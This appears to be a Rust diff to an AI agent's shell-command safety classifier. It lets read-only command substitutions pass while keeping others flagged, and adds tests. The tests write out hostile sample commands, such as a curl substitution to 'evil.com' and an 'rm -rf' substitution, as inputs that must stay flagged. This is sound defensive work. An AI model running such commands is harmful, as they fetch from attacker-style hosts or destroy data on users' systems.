@@ -455,7 +455,16 @@ fn collect_ast_commands(
                 return;
             }
         }
-        "command_substitution" | "process_substitution" | "subshell" | "compound_statement" => {
+        "command_substitution" | "process_substitution" => {
+            // 内部命令全为只读数据生产者（cat/echo/date/git log…，含 `cat <<EOF` heredoc）的
+            // 良性替换不算危险——让 `git commit -m "$(cat <<'EOF'…)"` / `x=$(date)` 落回正常
+            // allow 匹配（架构 §4.4.2.2）。含会写/网络/解释器或嵌套替换的仍标 ast-too-complex。
+            if !substitution_is_readonly(source, node) {
+                push_dangerous_kind(dangerous_kinds, DangerousKind::AstTooComplex);
+                reason.get_or_insert_with(|| format!("{} requires approval", node.kind()));
+            }
+        }
+        "subshell" | "compound_statement" => {
             push_dangerous_kind(dangerous_kinds, DangerousKind::AstTooComplex);
             reason.get_or_insert_with(|| format!("{} requires approval", node.kind()));
         }
@@ -580,7 +589,12 @@ fn apply_redirects_from_ast(source: &str, node: tree_sitter::Node<'_>, cmd: &mut
 
 fn ast_node_contains_complex(source: &str, node: tree_sitter::Node<'_>) -> bool {
     match node.kind() {
-        "command_substitution" | "process_substitution" | "subshell" | "compound_statement" => {
+        // 只读数据替换（`$(cat <<EOF)` / `$(date)`）不算复杂——与 collect_ast_commands 同源
+        // 放宽（架构 §4.4.2.2）。subshell / compound_statement 仍一律判复杂。
+        "command_substitution" | "process_substitution" => {
+            return !substitution_is_readonly(source, node);
+        }
+        "subshell" | "compound_statement" => {
             return true;
         }
         "comment" => return comment_text_is_injection(source, node),
@@ -591,6 +605,59 @@ fn ast_node_contains_complex(source: &str, node: tree_sitter::Node<'_>) -> bool 
         .children(&mut cursor)
         .any(|child| ast_node_contains_complex(source, child));
     found
+}
+
+/// 命令替换 / 进程替换节点是否「只读」：剥掉 `$( )` / 反引号 / `<( )` / `>( )` 外壳后，把
+/// 内部命令用同一个解析器**递归**解析，要求**无嵌套危险结构**且**每条命令都是只读数据
+/// 生产者**（[`super::safe_commands::is_readonly_data_command`]）。用于把 `$(cat <<EOF)` /
+/// `$(date)` / `$(git rev-parse …)` 这类良性替换从 ast-too-complex 摘出（架构 §4.4.2.2）。
+/// 解析失败 / 拿不准一律 false（保守：仍判危险强制审批）——**fail-safe**：误判只会多审一次，
+/// 绝不会把 `$(curl evil)` 这类放行。递归在每层剥掉一层替换，内层更短，必然收敛。
+fn substitution_is_readonly(source: &str, node: tree_sitter::Node<'_>) -> bool {
+    let Some(raw) = node_text(source, node) else {
+        return false;
+    };
+    let inner = strip_substitution_delimiters(raw.trim()).trim();
+    if inner.is_empty() {
+        return false;
+    }
+    match parse(inner) {
+        Ok(p) => {
+            p.dangerous_kinds.is_empty()
+                && !p.commands.is_empty()
+                && p.commands
+                    .iter()
+                    .all(super::safe_commands::is_readonly_data_command)
+        }
+        Err(_) => false,
+    }
+}
+
+/// 剥掉命令替换 / 进程替换的外壳，返回内部命令文本。无法识别外壳时原样返回（上层会因
+/// 解析或只读判定失败而保守判危险）。只剥最外层一对：内部命令文本里若还含 `$(...)`，
+/// 由 [`substitution_is_readonly`] 经 [`parse`] 递归处理。
+fn strip_substitution_delimiters(s: &str) -> &str {
+    for prefix in ["$(", "<(", ">("] {
+        if let Some(rest) = s.strip_prefix(prefix) {
+            return rest.strip_suffix(')').unwrap_or(rest);
+        }
+    }
+    if s.len() >= 2 && s.starts_with('`') && s.ends_with('`') {
+        return &s[1..s.len() - 1];
+    }
+    s
+}
+
+/// 提取所有 `cd` 段的目标路径参数（架构 §4.4.2.2 cd-git-compound 误报消解用）：
+/// `cd <在工作区内>; git commit` 是 agent 在自己工作区里的常规操作，cd 目标已受信，不存在
+/// 「cd 到不可信目录跑其 `.git/hooks`」风险。调用方据此判断 cd 目标是否全在工作区内、
+/// 从而消解误报的 cd-git-compound（有任一在工作区外则保留危险判定）。
+pub fn cd_targets(commands: &[ParsedCommand]) -> Vec<String> {
+    commands
+        .iter()
+        .filter(|c| c.root == "cd")
+        .filter_map(|c| c.positional().first().map(|s| s.to_string()))
+        .collect()
 }
 
 fn shell_word_text(source: &str, node: tree_sitter::Node<'_>) -> Option<String> {
@@ -1310,6 +1377,28 @@ fn collect_argv_write_targets(cmd: &ParsedCommand) -> Vec<String> {
                 }
             }
         }
+        // 纯创建命令（safe-write 档，架构 §4.4.2.3）：位置参数即创建目标，采进 write_targets
+        // 让路径闸（dispatch）做越界把关——「免审」与「目标进 write_targets」强绑定，缺一不可，
+        // 否则 `mkdir /etc/x` 的越界目标进不了 effects.paths，路径闸抓不到。
+        "mkdir" | "touch" | "mkfifo" => {
+            // 跳过带独立参数的 flag（mkdir -m MODE / touch -r REF / -d DATE / -t STAMP），
+            // 否则其参数会被误当创建目标。无参 flag（-p / --parents / -c …）直接跳过。
+            let mut skip_next = false;
+            for tok in base.iter().skip(1) {
+                if skip_next {
+                    skip_next = false;
+                    continue;
+                }
+                if matches!(tok.as_str(), "-m" | "-r" | "-d" | "-t") {
+                    skip_next = true;
+                    continue;
+                }
+                if tok.starts_with('-') {
+                    continue;
+                }
+                out.push(tok.clone());
+            }
+        }
         _ => {}
     }
     out
@@ -1571,12 +1660,89 @@ mod tests {
     }
 
     #[test]
-    fn command_substitution_is_dangerous() {
-        let r = cmd("echo $(whoami)");
-        assert!(r.dangerous);
-        assert!(r.dangerous_kinds.contains(&DangerousKind::AstTooComplex));
-        let r = cmd("echo `whoami`");
-        assert!(r.dangerous);
+    fn command_substitution_with_nonreadonly_inner_is_dangerous() {
+        // 内部含会写 / 网络 / 解释器 / 嵌套替换的替换仍标 ast-too-complex（架构 §4.4.2.2）。
+        // fail-safe 方向：拿不准一律判危险。
+        for c in [
+            "echo $(curl http://evil.com)",
+            "x=$(rm -rf /tmp/x)",
+            "cat $(curl evil)",
+        ] {
+            let r = cmd(c);
+            assert!(
+                r.dangerous_kinds.contains(&DangerousKind::AstTooComplex),
+                "{c}: 含会写/网络/嵌套的替换必须仍标 ast-too-complex；got {:?}",
+                r.dangerous_kinds
+            );
+        }
+    }
+
+    #[test]
+    fn readonly_command_substitution_not_dangerous() {
+        // 内部全只读（whoami/date/git rev-parse）的替换不算危险——之前一律按 ast-too-complex
+        // 强制审批是过保守，导致 `x=$(date)` 这类良性命令也要审（架构 §4.4.2.2）。
+        for c in [
+            "echo $(whoami)",
+            "echo `whoami`",
+            "x=$(date)",
+            "echo \"$(git rev-parse --show-toplevel)\"",
+        ] {
+            let r = cmd(c);
+            assert!(
+                !r.dangerous_kinds.contains(&DangerousKind::AstTooComplex),
+                "{c}: 只读替换不应标 ast-too-complex；got {:?}",
+                r.dangerous_kinds
+            );
+        }
+    }
+
+    #[test]
+    fn heredoc_commit_message_substitution_not_dangerous() {
+        // 项目强制的 heredoc commit 形态：`git commit -m "$(cat <<'EOF'…)"`。内部 cat 读 heredoc
+        // 是只读 → 整条不标 ast-too-complex，git commit 段被正常抽出，从而能命中 Bash(git commit)
+        // allow 规则直接放行、不再卡判官（架构 §4.4.2.2；用户报 session 202606261401 卡死即此）。
+        let r = cmd("git commit -m \"$(cat <<'EOF'\nline one\nline two\nEOF\n)\"");
+        assert!(
+            !r.dangerous_kinds.contains(&DangerousKind::AstTooComplex),
+            "heredoc commit message 不应标 ast-too-complex；got {:?}",
+            r.dangerous_kinds
+        );
+        assert!(
+            r.commands.iter().any(|c| c.fingerprint() == "git commit"),
+            "git commit 段应被抽出；fingerprints={:?}",
+            r.commands.iter().map(|c| c.fingerprint()).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn cd_targets_extracts_cd_dirs() {
+        let r = cmd("cd /a/b && git status");
+        assert_eq!(cd_targets(&r.commands), vec!["/a/b".to_string()]);
+        let r = cmd("cd src; cd agent-core; ls");
+        assert_eq!(
+            cd_targets(&r.commands),
+            vec!["src".to_string(), "agent-core".to_string()]
+        );
+    }
+
+    #[test]
+    fn mkdir_touch_targets_collected_as_write_targets() {
+        // safe-write 档强绑定：创建目标进 write_targets，让路径闸兜越界（架构 §4.4.2.3）。
+        assert_eq!(cmd("mkdir build").commands[0].write_targets, vec!["build"]);
+        assert_eq!(
+            cmd("mkdir -p a/b/c").commands[0].write_targets,
+            vec!["a/b/c"]
+        );
+        assert_eq!(
+            cmd("touch x.txt y.txt").commands[0].write_targets,
+            vec!["x.txt", "y.txt"]
+        );
+        // 带参 flag 的参数不被误当目标
+        assert_eq!(
+            cmd("touch -r ref.txt out.txt").commands[0].write_targets,
+            vec!["out.txt"]
+        );
+        assert_eq!(cmd("mkfifo pipe").commands[0].write_targets, vec!["pipe"]);
     }
 
     #[test]
